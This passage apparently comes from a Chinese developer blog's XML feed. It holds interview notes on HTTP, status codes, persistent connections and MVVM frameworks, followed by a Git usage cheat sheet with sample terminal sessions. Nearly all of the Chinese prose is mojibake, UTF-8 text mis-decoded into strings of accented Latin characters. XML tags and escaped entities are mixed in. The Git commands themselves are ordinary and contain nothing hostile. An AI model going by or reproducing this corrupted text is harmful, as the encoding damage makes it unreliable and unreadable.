interview book http åè®®ç±»ä¸»è¦ç‰¹ç‚¹ï¼šç®€å•å¿«é€Ÿã€çµæ´»ã€æ— è¿žæŽ¥å’Œæ— çŠ¶æ€ http æŠ¥æ–‡ç»„æˆéƒ¨åˆ†ï¼šè¯·æ±‚æŠ¥æ–‡ã€å“åº”æŠ¥æ–‡è¯·æ±‚æŠ¥æ–‡ï¼šè¯·æ±‚è¡Œï¼ˆæ–¹æ³•ã€åè®®å’Œç‰ˆæœ¬ï¼‰ã€è¯·æ±‚å¤´ï¼ˆkey å’Œ value å€¼ï¼‰ã€ç©ºè¡Œã€è¯·æ±‚ä½“å“åº”æŠ¥æ–‡ï¼šå“åº”è¡Œï¼ˆåè®®ã€ç‰ˆæœ¬å’ŒçŠ¶æ€ç ï¼‰ã€å“åº”å¤´ï¼ˆkey å’Œ value å€¼ï¼‰ã€ç©ºè¡Œã€å“åº”ä½“ http æ–¹æ³•POST GET PUTï¼ˆæ›´æ–°èµ„æºï¼‰ DELETEï¼ˆåˆ é™¤èµ„æºï¼‰ HEAD(èŽ·å–æŠ¥æ–‡é¦–éƒ¨) GET å’Œ POST çš„ä¼˜ç¼ºç‚¹ï¼š GET åœ¨æµè§ˆå™¨å›žé€€æ—¶æ˜¯æ— å®³çš„ï¼Œè€Œ POST ä¼šå†æ¬¡æäº¤è¯·æ±‚ GET äº§ç”Ÿ URL åœ°å€å¯ä»¥æ”¶è—ï¼Œè€Œ POST ä¸å¯ä»¥ GET è¯·æ±‚ä¼šè¢«æµè§ˆå™¨ä¸»åŠ¨ç¼“å­˜ï¼Œè€Œ POST ä¸ä¼šï¼Œé™¤éžæ”¶çš„é‚£ä¸ªè®¾ç½® GET è¯·æ±‚å€¼èƒ½è¿›è¡Œ url ç¼–ç ï¼Œè€Œ POST æ”¯æŒå¤šç§ç¼–ç æ–¹å¼ GET è¯·æ±‚å‚æ•°ä¼šè¢«å®Œæ•´ä¿ç•™åœ¨æµè§ˆå™¨åŽ†å²è®°å½•é‡Œï¼Œè€Œ POST ä¸­çš„å‚æ•°ä¸ä¼šè¢«ä¿ç•™ GET è¯·æ±‚åœ¨ URL ä¸­ä¼ é€çš„å‚æ•°æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œè€Œ POST æ²¡æœ‰é™åˆ¶ å¯¹å‚æ•°çš„æ•°æ®ç±»åž‹ï¼ŒGET åªæŽ¥å— ASCII å­—ç¬¦ï¼Œè€Œ POST æ²¡æœ‰é™åˆ¶ GET æ¯” POST æ›´ä¸å®‰å…¨ï¼Œå› ä¸ºå‚æ•°ç›´æŽ¥æš´éœ²åœ¨ URL ä¸Šï¼Œæ‰€ä»¥ä¸èƒ½ç”¨æ¥ä¼ é€’æ•æ„Ÿä¿¡æ¯ GET å‚æ•°é€šè¿‡ URL ä¼ é€’ï¼ŒPOST æ”¾åœ¨ Request body ä¸­ 1xx æŒ‡ç¤ºä¿¡æ¯-è¯·æ±‚å·²æŽ¥æ”¶ï¼Œç»§ç»­å¤„ç† 2xx æˆåŠŸ 3xx é‡å®šå‘ 4xx å®¢æˆ·ç«¯é”™è¯¯ 5xx æœåŠ¡å™¨é”™è¯¯ 200 OK 206 å®¢æˆ·ç«¯å‘é€äº†ä¸€ä¸ªå¸¦æœ‰ Range å¤´çš„ GET è¯·æ±‚ï¼ŒæœåŠ¡å™¨å®Œæˆäº†å®ƒ 301 è¯·æ±‚é¡µé¢å·²ç»è½¬ç§»è‡³æ–°çš„ url 302 é¡µé¢å·²ç»ä¸´æ—¶è½¬ç§»è‡³æ–°çš„ url 304 åŽŸæ¥ç¼“å­˜çš„æ–‡æ¡£è¿˜å¯ä»¥ç»§ç»­ä½¿ç”¨ 400 å®¢æˆ·ç«¯è¯·æ±‚æœ‰è¯­æ³•é”™è¯¯ï¼Œä¸èƒ½è¢«æœåŠ¡å™¨ç†è§£ 401 è¯·æ±‚æœªæŽˆæƒ 403 è®¿é—®è¢«ç¦æ­¢ 404 èµ„æºä¸å­˜åœ¨ 500 æœåŠ¡å‘ç”Ÿä¸å¯é¢„æœŸçš„é”™è¯¯ 503 è¯·æ±‚å®Œæˆï¼ŒæœåŠ¡å™¨ä¸´æ—¶è¿‡è½½æˆ–å®•æœº æŒä¹…è¿žæŽ¥HTTP åè®®é‡‡ç”¨â€œè¯·æ±‚-åº”ç­”â€æ¨¡å¼ï¼Œå½“ä½¿ç”¨æ™®é€šæ¨¡å¼ï¼Œå³éž keep-alive æ¨¡å¼æ—¶ï¼Œæ¯ä¸ªè¯·æ±‚å’ŒæœåŠ¡å™¨éƒ½è¦æ–°å»ºä¸€ä¸ªé“¾æŽ¥ï¼Œå®ŒæˆåŽç«‹å³æ–­å¼€è¿žæŽ¥ï¼ˆHTTP åè®®ä¸ºæ— è¿žæŽ¥çš„åè®®ï¼‰ å½“ä½¿ç”¨ keep-alive æ¨¡å¼ï¼ˆåˆç§°æŒä¹…è¿žæŽ¥ã€è¿žæŽ¥é‡ç”¨ï¼‰æ—¶ï¼Œkeep-alive åŠŸèƒ½æ˜¯å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨ç«¯çš„è¿žæŽ¥æŒç»­æœ‰æ•ˆï¼Œå½“å‡ºæ ¡å¯¹æœåŠ¡å™¨çš„åŽç»§è¯·æ±‚æ—¶ï¼Œkeep-alive åŠŸèƒ½é¿å…äº†å»ºç«‹æˆ–è€…é‡æ–°å»ºç«‹è¿žæŽ¥ ç®¡çº¿åŒ–åœ¨ä½¿ç”¨æŒä¹…è¿žæŽ¥çš„æƒ…å†µä¸‹ï¼ŒæŸä¸ªé“¾æŽ¥ä¸Šæ¶ˆæ¯çš„ä¼ é€’ç±»ä¼¼äºŽè¯·æ±‚ 1 -&gt; x å“åº” 1 -&gt; è¯·æ±‚ 2 -&gt; å“åº” 2 ç®¡çº¿åŒ–ï¼Œåœ¨æŒä¹…è¿žæŽ¥çš„åŸºç¡€ä¸Šï¼Œç±»ä¼¼äºŽè¯·æ±‚ 1 -&gt; è¯·æ±‚ 2 -&gt; å“åº” 1 -&gt; å“åº” 2 ç®¡çº¿åŒ–ç‰¹ç‚¹ï¼š ç®¡çº¿åŒ–æœºåˆ¶é€šè¿‡æŒä¹…åŒ–å®Œæˆï¼Œä»… HTTP/1.1 æ”¯æŒ åªæœ‰ GET å’Œ HEAD è¯·æ±‚å¯ä»¥è¿›è¡Œç®¡çº¿åŒ–ï¼Œè€Œ POST æœ‰æ‰€é™åˆ¶ ç®¡çº¿åŒ–ä¸ä¼šå½±å“å“åº”åˆ°æ¥çš„é¡ºåº æœåŠ¡å™¨ç«¯æ”¯æŒç®¡çº¿åŒ–ï¼Œå¹¶ä¸è¦æ±‚æœåŠ¡å™¨ç«¯ä¹Ÿå¯¹å“åº”è¿›è¡Œç®¡çº¿åŒ–å¤„ç†ï¼Œåªæ˜¯è¦æ±‚å¯¹äºŽç®¡çº¿åŒ–çš„è¯·æ±‚ä¸å¤±è´¥ é‡åˆ°çš„é—®é¢˜ï¼šé€’å½’åº”ç”¨å†…å­˜æ³„æ¼ï¼ŒåŽŸç”Ÿå¯¹è±¡å’Œ DOM å¯¹è±¡ç›¸äº’å¼•ç”¨å¯¼è‡´å†…å­˜æ³„æ¼ MVVMäº†è§£ MVVM æ¡†æž¶å—ï¼Ÿç”¨è¿‡ vue.js èŠ vue.js æœ‰å“ªäº›ä¼˜ç‚¹ï¼Œç¼ºç‚¹ï¼Ÿ React å’Œ Vue ç›¸ä¼¼ä¹‹å¤„ï¼š ä½¿ç”¨ Virtual DOM æä¾›äº†å“åº”å¼ï¼ˆReactiveï¼‰å’Œç»„ä»¶åŒ–ï¼ˆComposableï¼‰çš„è§†å›¾ç»„ä»¶ å°†æ³¨æ„åŠ›é›†ä¸­ä¿æŒåœ¨å’Œæ ¸å¿ƒåº“ï¼Œè€Œå°†å…¶ä»–åŠŸèƒ½å¦‚è·¯ç”±å’Œå…¨å±€çŠ¶æ€äº¤ç»™ç›¸å…³çš„åº“ ä¸åŒä¹‹å¤„ï¼š React æœ‰æ›´ä¸°å¯Œçš„ç”Ÿæ€ç³»ç»Ÿ React åœ¨æŸä¸ªç»„ä»¶çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå®ƒä¼šä»¥è¯¥ç»„ä»¶ä¸ºæ ¹ï¼Œé‡æ–°æ¸²æŸ“æ•´ä¸ªç»„ä»¶å­æ ‘ï¼Œè€Œ Vue è‡ªåŠ¨è¿½è¸ªï¼Œç²¾ç¡®çŸ¥æ™“å“ªä¸ªç»„ä»¶éœ€è¦è¢«é‡æ¸²æŸ“ React æ¸²æŸ“åŠŸèƒ½ä¾é  JSXï¼Œæ”¯æŒç±»åž‹æ£€æŸ¥ã€ç¼–è¯‘å™¨è‡ªåŠ¨å®Œæˆï¼Œlintingï¼ŒVue é»˜è®¤æŽ¨èçš„è¿˜æ˜¯æ¨¡æ¿ CSS ä½œç”¨åŸŸåœ¨ React ä¸­æ˜¯é€šè¿‡ CSS-in-JS æ–¹æ¡ˆå®žçŽ°ï¼ŒVue è®¾ç½®æ ·å¼çš„é»˜è®¤æ–¹æ³•æ—¶å•æ–‡ä»¶ç»„ä»¶é‡Œç±»ä¼¼ style çš„æ ‡ç­¾ ç¼–å†™æœ‰æœ¬åœ°æ¸²æŸ“èƒ½åŠ›çš„ APPï¼ŒReact æœ‰ React Nativeï¼Œæ¯”è¾ƒæˆç†Ÿã€‚Vue æœ‰ Weexï¼Œè¿˜åœ¨å¿«é€Ÿå‘å±•ä¸­ æ”¶ä½ä¼˜ç‚¹ï¼Œæ”’ç€ä¸‹é¢è¯´ å¯¹ MVVM çš„è®¤è¯†1. å…ˆèŠä¸€ä¸‹ MVCMVCï¼šModelï¼ˆæ¨¡åž‹ï¼‰ Viewï¼ˆè§†å›¾ï¼‰ Controllerï¼ˆæŽ§åˆ¶å™¨ï¼‰ï¼Œä¸»è¦æ˜¯åŸºäºŽåˆ†å±‚çš„ç›®çš„ï¼Œè®©å½¼æ­¤çš„èŒè´£åˆ†å¼€ã€‚ View é€šè¿‡ Controller å’Œ Model è”ç³»ï¼ŒController æ˜¯ View å’Œ Model çš„åè°ƒè€…ï¼Œview å’Œ Model ä¸ç›´æŽ¥è”ç³»ï¼ŒåŸºæœ¬è”ç³»éƒ½æ˜¯å•å‘çš„ã€‚ 2. é¡ºå¸¦æä¸‹ MVPMVPï¼šæ˜¯ä»Ž MVC æ¨¡å¼æ¼”å˜è€Œæ¥çš„ï¼Œéƒ½æ˜¯é€šè¿‡ Controller/Presenter è´Ÿè´£é€»è¾‘çš„å¤„ç†+Model æä¾›æ•°æ®+View è´Ÿè´£æ˜¾ç¤ºã€‚ åœ¨ MVP ä¸­ï¼ŒPresenter å®Œå…¨æŠŠ View å’Œ Model è¿›è¡Œåˆ†ç¦»ï¼Œä¸»è¦çš„ç¨‹åºé€»è¾‘åœ¨ Presenter é‡Œå®žçŽ°ã€‚å¹¶ä¸”ï¼ŒPresenter å’Œ View æ˜¯æ²¡æœ‰ç›´æŽ¥å…³è”çš„ï¼Œæ˜¯é€šè¿‡å®šä¹‰å¥½çš„æŽ¥å£è¿›è¡Œäº¤äº’ï¼Œä»Žè€Œä½¿å¾—åœ¨å˜æ›´ View çš„æ—¶å€™å¯ä»¥ä¿æŒ Presenter ä¸å˜ã€‚ 3. å†èŠèŠ MVVNMVVMï¼šModel + View + ViewModelï¼ŒæŠŠ MVC ä¸­çš„ Controller å’Œ MVP ä¸­çš„ Presenter æ”¹æˆ ViewModel view çš„å˜åŒ–ä¼šè‡ªåŠ¨æ›´æ–°åˆ° ViewModelï¼ŒViewModel çš„å˜åŒ–ä¹Ÿä¼šè‡ªåŠ¨åŒæ­¥åˆ° View ä¸Šæ˜¾ç¤ºã€‚è¿™ç§è‡ªåŠ¨åŒæ­¥æ˜¯å› ä¸º ViewModel ä¸­çš„å±žæ€§å®žçŽ°äº† Observerï¼Œå½“å±žæ€§å˜æ›´æ—¶éƒ½èƒ½è§¦å‘å¯¹åº”æ“ä½œã€‚ View æ˜¯ HTML æ–‡æœ¬çš„ js æ¨¡æ¿ï¼› ViewModel æ˜¯ä¸šåŠ¡é€»è¾‘å±‚ï¼ˆä¸€åˆ‡ js å¯è§†ä¸šåŠ¡é€»è¾‘ï¼Œæ¯”å¦‚è¡¨å•æŒ‰é’®æäº¤ï¼Œè‡ªå®šä¹‰äº‹ä»¶çš„æ³¨å†Œå’Œå¤„ç†é€»è¾‘éƒ½åœ¨ viewmodel é‡Œé¢è´Ÿè´£ç›‘æŽ§ä¿©è¾¹çš„æ•°æ®ï¼‰ï¼› Model æ•°æ®å±‚ï¼Œå¯¹æ•°æ®çš„å¤„ç†ï¼ˆä¸ŽåŽå°æ•°æ®äº¤äº’çš„å¢žåˆ æ”¹æŸ¥ï¼‰ æä¸€ä¸‹æˆ‘ç†Ÿæ‚‰çš„ MVVM æ¡†æž¶ï¼švue.jsï¼ŒVue.js æ˜¯ä¸€ä¸ªæž„å»ºæ•°æ®é©±åŠ¨çš„ web ç•Œé¢çš„æ¸è¿›å¼æ¡†æž¶ã€‚Vue.js çš„ç›®æ ‡æ˜¯é€šè¿‡å°½å¯èƒ½ç®€å•çš„ API å®žçŽ°å“åº”çš„æ•°æ®ç»‘å®šå’Œç»„åˆçš„è§†å›¾ç»„ä»¶ã€‚æ ¸å¿ƒæ˜¯ä¸€ä¸ªå“åº”çš„æ•°æ®ç»‘å®šç³»ç»Ÿã€‚ 4. ä¸€å¥è¯æ€»ç»“ä¸‹ä¸åŒä¹‹å¤„MVC ä¸­è”ç³»æ˜¯å•å‘çš„ï¼ŒMVP ä¸­ P å’Œ V é€šè¿‡æŽ¥å£äº¤äº’ï¼ŒMVVM çš„è”ç³»æ˜¯åŒå‘çš„ åŒå‘æ•°æ®ç»‘å®šåŽŸç† Object.defineProperty ç”¨æ³•ç†Ÿè®°äºŽå¿ƒ Object.defineProperty ä¸Ž Reflect.defineProperty åŒºåˆ«Reflect.defineProperty è¿”å›žçš„æ˜¯ boolean å€¼ MVVM è®¾è®¡æ¨¡å¼è¿™ä¸ªå›žé¡¾ä¸€ä¸‹è‡ªå·±å†™çš„æ–‡ç« ]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Gitç®€è®°]]></title>
    <url>%2F2018%2F02%2F27%2FGit%E7%AE%80%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[0. å‰è¨€æœ€è¿‘æœ‰ä¸ªé¡¹ç›®æ¯”è¾ƒèµ¶ï¼ŒäºŽæ˜¯å†³å®š8ä¸ªäººä¸€ä¸ªå¹¶è¡Œå®Œæˆï¼Œå•ç‹¬æŠŠé¡¹ç›®æ‹¿å‡ºæ¥ç”¨giteaç®¡ç†ï¼Œæ²¡äººåˆ†ä¸€ä¸ªæ¨¡å—å¼€å‘ï¼Œå¯¹åº”ä¹Ÿç»™åˆ†æ”¯ï¼Œæ•ˆæžœä¸è¿‡ï¼Œä»Žä¸­ä¹Ÿå¸®åŠ©è‡ªå·±é‡æ–°æ¸©ä¹ äº†ä¸€ä¸‹gitçš„ä½¿ç”¨ï¼Œå°è®°ä¸€ä¸‹ã€‚ 1. å®‰è£…å’Œä½¿ç”¨ åœ¨MACä¸Šï¼Œå®‰è£…homebrewï¼Œç„¶åŽé€šè¿‡homebrew å®‰è£…Gitã€‚ åœ¨MACä¸Šå¦ä¸€ç§å®‰è£…æ–¹æ³•ï¼Œä»ŽAppStoreå®‰è£…Xcodeï¼ŒXcodeé›†æˆäº†Gitï¼Œä¸è¿‡é»˜è®¤æ²¡æœ‰å®‰è£…ï¼Œä½ éœ€è¦è¿è¡ŒXcodeï¼Œé€‰æ‹©èœå•â€œXcodeâ€-&gt;â€œPreferencesâ€ï¼Œåœ¨å¼¹å‡ºçª—å£ä¸­æ‰¾åˆ°â€œDownloadsâ€ï¼Œé€‰æ‹©â€œCommand Line Toolsâ€ï¼Œç‚¹â€œInstallâ€å°±å¯ä»¥å®Œæˆå®‰è£…äº†ã€‚ åœ¨Windowsä¸Šï¼Œä¸‹è½½å®‰è£…åŒ…ï¼Œé»˜è®¤ä¸‹ä¸€æ­¥ï¼Œå®‰è£…å®Œæˆå³å¯ã€‚ å®‰è£…å®ŒåŽè‡ªæŠ¥å®¶é—¨ 12$ git config --global user.name &quot;wuwhs&quot;$ git config --global user.email &quot;email@example.com&quot; åˆ›å»ºç‰ˆæœ¬åº“ åˆå§‹åŒ–ä¸€ä¸ªGitä»“åº“ï¼Œä½¿ç”¨git initå‘½ä»¤ã€‚æ·»åŠ æ–‡ä»¶åˆ°Gitä»“åº“ï¼Œåˆ†ä¸¤æ­¥ï¼š ç¬¬ä¸€æ­¥ï¼Œä½¿ç”¨å‘½ä»¤git add &lt;file&gt;ï¼Œæ³¨æ„ï¼Œå¯åå¤å¤šæ¬¡ä½¿ç”¨ï¼Œæ·»åŠ å¤šä¸ªæ–‡ä»¶ï¼› ç¬¬äºŒæ­¥ï¼Œä½¿ç”¨å‘½ä»¤git commitï¼Œå®Œæˆã€‚ 2. æ—¶å…‰ç©¿æ¢­ å¦‚æžœgit statuså‘Šè¯‰ä½ æœ‰æ–‡ä»¶è¢«ä¿®æ”¹è¿‡ï¼Œç”¨git diffå¯ä»¥æŸ¥çœ‹ä¿®æ”¹å†…å®¹ã€‚ HEADæŒ‡å‘çš„ç‰ˆæœ¬å°±æ˜¯å½“å‰ç‰ˆæœ¬ï¼Œå› æ­¤ï¼ŒGitå…è®¸æˆ‘ä»¬åœ¨ç‰ˆæœ¬çš„åŽ†å²ä¹‹é—´ç©¿æ¢­ï¼Œä½¿ç”¨å‘½ä»¤git reset --hard commit_idã€‚ ç©¿æ¢­å‰ï¼Œç”¨git logå¯ä»¥æŸ¥çœ‹æäº¤åŽ†å²ï¼Œä»¥ä¾¿ç¡®å®šè¦å›žé€€åˆ°å“ªä¸ªç‰ˆæœ¬ã€‚ è¦é‡è¿”æœªæ¥ï¼Œç”¨git reflogæŸ¥çœ‹å‘½ä»¤åŽ†å²ï¼Œä»¥ä¾¿ç¡®å®šè¦å›žåˆ°æœªæ¥çš„å“ªä¸ªç‰ˆæœ¬ï¼Œgit log --pretty=oneline --abbrev-commitåœ¨ä¸€è¡Œæ˜¾ç¤ºç¼©å†™æäº¤å·ã€‚ åœºæ™¯1ï¼šå½“ä½ æ”¹ä¹±äº†å·¥ä½œåŒºæŸä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œæƒ³ç›´æŽ¥ä¸¢å¼ƒå·¥ä½œåŒºçš„ä¿®æ”¹æ—¶ï¼Œç”¨å‘½ä»¤git checkout -- fileã€‚ å½“ä½ ä¸ä½†æ”¹ä¹±äº†å·¥ä½œåŒºæŸä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œè¿˜æ·»åŠ åˆ°äº†æš‚å­˜åŒºæ—¶ï¼Œæƒ³ä¸¢å¼ƒä¿®æ”¹ï¼Œåˆ†ä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥ç”¨å‘½ä»¤git reset HEAD fileï¼Œå°±å›žåˆ°äº†åœºæ™¯1ï¼Œç¬¬äºŒæ­¥æŒ‰åœºæ™¯1æ“ä½œã€‚ å‘½ä»¤git rmç”¨äºŽåˆ é™¤ä¸€ä¸ªæ–‡ä»¶ã€‚å¦‚æžœä¸€ä¸ªæ–‡ä»¶å·²ç»è¢«æäº¤åˆ°ç‰ˆæœ¬åº“ï¼Œé‚£ä¹ˆä½ æ°¸è¿œä¸ç”¨æ‹…å¿ƒè¯¯åˆ ï¼Œä½†æ˜¯è¦å°å¿ƒï¼Œä½ åªèƒ½æ¢å¤æ–‡ä»¶åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œä½ ä¼šä¸¢å¤±æœ€è¿‘ä¸€æ¬¡æäº¤åŽä½ ä¿®æ”¹çš„å†…å®¹ã€‚ 3. è¿œç¨‹ä»“åº“ åˆ›å»ºSSH Keyã€‚$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot;ã€‚ ç™»é™†GitHubï¼Œæ‰“å¼€â€œAccount settingsâ€ï¼Œâ€œSSH Keysâ€é¡µé¢ã€‚ç„¶åŽï¼Œç‚¹â€œAdd SSH Keyâ€ï¼Œå¡«ä¸Šä»»æ„Titleï¼Œåœ¨Keyæ–‡æœ¬æ¡†é‡Œç²˜è´´id_rsa.pubæ–‡ä»¶çš„å†…å®¹ã€‚ è¦å…³è”ä¸€ä¸ªè¿œç¨‹åº“ï¼Œä½¿ç”¨å‘½ä»¤git remote add origin git@server-name:path/repo-name.gitã€‚ å…³è”åŽï¼Œä½¿ç”¨å‘½ä»¤git push -u origin masterç¬¬ä¸€æ¬¡æŽ¨é€masteråˆ†æ”¯çš„æ‰€æœ‰å†…å®¹ã€‚ æ­¤åŽï¼Œæ¯æ¬¡æœ¬åœ°æäº¤åŽï¼Œåªè¦æœ‰å¿…è¦ï¼Œå°±å¯ä»¥ä½¿ç”¨å‘½ä»¤git push origin masteræŽ¨é€æœ€æ–°ä¿®æ”¹ã€‚ è¦å…‹éš†ä¸€ä¸ªä»“åº“ï¼Œé¦–å…ˆå¿…é¡»çŸ¥é“ä»“åº“çš„åœ°å€ï¼Œç„¶åŽä½¿ç”¨git cloneå‘½ä»¤å…‹éš†ã€‚ 4. åˆ†æ”¯ç®¡ç† Gité¼“åŠ±å¤§é‡ä½¿ç”¨åˆ†æ”¯ã€‚ æŸ¥çœ‹åˆ†æ”¯ï¼šgit branchã€‚ åˆ›å»ºåˆ†æ”¯ï¼šgit branch &lt;name&gt;ã€‚ åˆ‡æ¢åˆ†æ”¯ï¼šgit checkout &lt;name&gt;ã€‚ åˆ›å»º+åˆ‡æ¢åˆ°å½“å‰åˆ†æ”¯ï¼šgit checkout -b &lt;name&gt;ã€‚ åˆå¹¶æŸåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯ï¼šgit merge &lt;name&gt;ã€‚ åˆ é™¤åˆ†æ”¯ï¼šgit branch -d &lt;name&gt;ã€‚ å½“Gitæ— æ³•è‡ªåŠ¨åˆå¹¶åˆ†æ”¯æ—¶ï¼Œå°±å¿…é¡»é¦–å…ˆå‰žåŠ‚å†²çªï¼Œè§£å†³å†²çªåŽï¼Œå†æäº¤ï¼Œåˆå¹¶å®Œæˆç”¨git log --graphå‘½ä»¤å¯ä»¥çœ‹åˆ°åˆ†æ”¯åˆå¹¶å›¾ã€‚ åˆå¹¶åˆ†æ”¯æ—¶ï¼ŒåŠ ä¸Š--no-ffå‚æ•°å°±å¯ä»¥ç”¨æ™®é€šæ¨¡å¼åˆå¹¶ï¼Œåˆå¹¶åŽçš„åŽ†å²æœ‰åˆ†æ”¯ï¼Œèƒ½çœ‹å‡ºæ¥æ›¾ç»åšè¿‡åˆå¹¶ï¼Œè€Œfash-forwardåˆå¹¶å°±çœ‹ä¸å‡ºæ¥æ›¾ç»åšè¿‡åˆå¹¶ã€‚ å½“æ‰‹å¤´å·¥ä½œæ²¡æœ‰å®Œæˆæ—¶ï¼Œå…ˆæŠŠå·¥ä½œçŽ°åœºgit stashä¸€ä¸‹ï¼Œç„¶åŽåŽ»ä¿®å¤bugï¼Œä¿®å¤åŽï¼Œå†git stash listæŸ¥çœ‹åŽ†å²stashï¼Œä¸€æ˜¯ç”¨git stash applyæ¢å¤ï¼Œä½†æ¢å¤åŽï¼Œstashå†…å®¹å¹¶ä¸åˆ é™¤ï¼Œä½ éœ€è¦ç”¨git stash dropæ¥åˆ é™¤ï¼›å¦ä¸€ç§æ–¹å¼æ˜¯ç”¨git stash popï¼Œæ¢å¤çš„åŒæ—¶æŠŠstashå†…å®¹ä¹Ÿåˆ äº†ã€‚ æŸ¥çœ‹è¿œç¨‹åº“ä¿¡æ¯ï¼Œä½¿ç”¨git remote -vã€‚ ä»Žæœ¬åœ°æŽ¨é€åˆ†æ”¯ï¼Œä½¿ç”¨git push origin branch-nameï¼Œå¦‚æžœå¤±è´¥ï¼Œå…ˆç”¨git pullæŠ“å–è¿œç¨‹çš„æ–°æäº¤ã€‚ å†æœ¬åœ°åˆ›å»ºå’Œè¿œç¨‹åˆ†æ”¯å¯¹åº”çš„åˆ†æ”¯ï¼Œä½¿ç”¨git checkout -b branch-name origin/branch-nameï¼Œæœ¬åœ°å’Œè¿œç¨‹åˆ†æ”¯çš„åç§°æœ€å¥½ä¸€è‡´ã€‚ ä»Žè¿œç¨‹æŠ“å–åˆ†æ”¯ï¼Œä½¿ç”¨git pullï¼Œå¦‚æžœæœ‰å†²çªï¼Œè¦å…ˆå¤„ç†å†²çªã€‚ 5. æ ‡ç­¾ å‘½ä»¤git tag &lt;name&gt;ç”¨äºŽæ–°å»ºä¸€ä¸ªæ ‡ç­¾ï¼Œé»˜è®¤ä¸ºHEAD,ä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªcommit idã€‚ git tag -a &lt;tagname&gt; -m &quot;balabala...&quot;å¯ä»¥æŒ‡å®šæ ‡ç­¾ä¿¡æ¯ã€‚ git tag -s &lt;tagname&gt; -m &quot;balabala...&quot;å¯ä»¥ç”¨PGPç­¾åæ ‡ç­¾ã€‚ å‘½ä»¤git tagå¯ä»¥æŸ¥çœ‹æ‰€æœ‰æ ‡ç­¾ã€‚ å‘½ä»¤git push origin &lt;tagname&gt;å¯ä»¥æŽ¨é€ä¸€ä¸ªæœ¬åœ°æ ‡ç­¾ã€‚ å‘½ä»¤git push origin --tagså¯ä»¥æŽ¨é€å…¨éƒ¨æœªæŽ¨é€è¿‡çš„æœ¬åœ°æ ‡ç­¾ã€‚ å‘½ä»¤git tag -d &lt;tagname&gt;å¯ä»¥åˆ é™¤ä¸€ä¸ªæœ¬åœ°æ ‡ç­¾ã€‚ å‘½ä»¤git push origin :refs/tags/&lt;tagname&gt;å¯ä»¥åˆ é™¤ä¸€ä¸ªè¿œç¨‹æ ‡ç­¾ã€‚ 6. ä¸¾ä¸ªåº”ç”¨æ —å­ æœ€åˆåœ¨è¿œç¨‹åˆ›å»ºé¡¹ç›®ä»“åº“æœ‰masterå’Œdevelpåˆ†æ”¯ï¼Œå‚ä¸Žå¼€å‘äººå‘˜å…ˆåœ¨è‡ªå·±ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼Œè°ƒå‡ºgit Bashï¼Œç„¶åŽè¾“å…¥å‘½ä»¤git initï¼Œå†æŠŠä»“åº“git cloneä¸‹æ¥ 12345678910MINGW32 /d/appSoft/wampserver/wamp64/www$ git initInitialized empty Git repository in D:/appSoft/wampserver/wamp64/www/.git/MINGW32 /d/appSoft/wampserver/wamp64/www (master)$ git clone git@github.com:wuwhs/demo.gitCloning into &apos;demo&apos;...Warning: Permanently added the RSA host key for IP address &apos;13.229.188.59&apos; to the list of known hosts.warning: You appear to have cloned an empty repository.Checking connectivity... done. cd demoè¿›å…¥cloneä¸‹è½½çš„ç›®å½•é‡Œï¼Œç”¨git branch developåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„developåˆ†æ”¯ 1234567891011121314MINGW32 /d/appSoft/wampserver/wamp64/www (master)$ cd demoMINGW32 /d/appSoft/wampserver/wamp64/www/demo (master)$ git branch* masterMINGW32 /d/appSoft/wampserver/wamp64/www/demo (master)$ git branch developMINGW32 /d/appSoft/wampserver/wamp64/www/demo (master)$ git branch develop* master å†æ¬¡ç”¨git branchæŸ¥çœ‹å·²ç»æ–°å»ºäº†ä¸€ä¸ªdevelopåˆ†æ”¯ git checkout developåˆ‡æ¢åˆ°å½“å‰developåˆ†æ”¯ 123MINGW32 /d/appSoft/wampserver/wamp64/www/demo (master)$ git checkout developSwitched to branch &apos;develop&apos; ç”¨git pull origin develop:developï¼Œå³ï¼šgit pull origin &lt;è¿œç¨‹ä¸»æœºå&gt; &lt;è¿œç¨‹åˆ†æ”¯å&gt;:&lt;æœ¬åœ°åˆ†æ”¯å&gt;ï¼Œå½“æœ¬åœ°å’Œè¿œç¨‹åˆ†æ”¯åç›¸åŒæ—¶ï¼Œå¯ä»¥ç®€å†™æˆä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯git pull origin developï¼Œæ‹‰å–è¿œç¨‹developåˆ†æ”¯å®Œæˆï¼Œç„¶åŽå¼€å‘äººå‘˜å°±å¯ä»¥åœ¨è¿™ä¸ªåˆ†æ”¯ä¸Šå·¥ä½œäº† 123456789101112MINGW32 /d/appSoft/wampserver/wamp64/www/demo (develop)$ git pull origin develop:developremote: Counting objects: 3, done.remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0Unpacking objects: 100% (3/3), done.From github.com:wuwhs/demo 7ff2cb0..7ab2842 develop -&gt; develop 7ff2cb0..7ab2842 develop -&gt; origin/developwarning: fetch updated the current branch head.fast-forwarding your working tree fromcommit 7ff2cb0627be357fa15db4e38e1bfe8fc820b8ec.Already up-to-date. å½“ä¸€å¤©äº†å·¥ä½œå®Œæˆï¼Œè¦æäº¤åˆ°è¿œç¨‹åˆ†æ”¯ï¼Œé¦–å…ˆè¦æ‹‰å–ä¸€ä¸‹åˆ«äººæäº¤çš„ä»£ç ï¼Œé˜²æ­¢ç‰ˆæœ¬å†²çª 123456789101112MINGW32 /d/appSoft/wampserver/wamp64/www/demo (develop)$ git pullremote: Counting objects: 3, done.remote: Compressing objects: 100% (2/2), done.remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0Unpacking objects: 100% (3/3), done.From github.com:wuwhs/demo f848dc7..d696375 develop -&gt; origin/developUpdating f848dc7..d696375Fast-forward demo.txt | 2 ++ 1 file changed, 2 insertions(+) 